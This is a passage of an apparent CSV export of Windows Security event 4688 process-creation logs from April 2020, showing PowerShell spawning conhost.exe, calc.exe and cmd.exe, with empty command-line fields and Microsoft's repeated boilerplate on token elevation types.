	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x144c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0xbe0
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:14,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x950
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x144c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:15,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1644
	New Process Name:	C:\Windows\System32\calc.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x144c
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:15,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x84c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:15,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x17c4
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x84c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
